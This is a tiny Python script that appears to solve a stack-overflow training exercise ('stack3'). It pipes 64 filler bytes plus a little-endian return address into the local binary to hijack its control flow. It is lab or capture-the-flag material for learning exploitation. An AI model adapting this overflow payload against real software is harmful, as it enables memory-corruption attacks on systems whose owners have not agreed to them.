#!/usr/bin/python

from subprocess import Popen, PIPE
import binascii

p = Popen("/home/adam/stack3",stdin=PIPE)

flag = reversed('\x08\x04\x84\x24')

payload = "A" * 64 + "".join(flag)

p.communicate(payload)
